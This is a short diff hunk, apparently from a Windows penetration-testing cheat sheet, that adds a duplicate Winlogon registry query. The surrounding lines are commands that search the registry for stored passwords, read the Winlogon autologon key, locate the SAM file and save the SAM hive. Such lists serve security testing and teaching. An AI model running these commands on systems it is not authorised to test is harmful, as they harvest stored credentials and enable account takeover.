@@ -1219,6 +1219,7 @@ Get-Service | Where-Object ($_.Status -eq 'Running')
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon"
 reg query HKLM\SYSTEM\CurrentControlSet\Services
 Get-ChildItem -Path C:\ -Include sam -File -Recurse -ErrorAction SilentlyContinue
 reg save HKLM\SAM sam.save
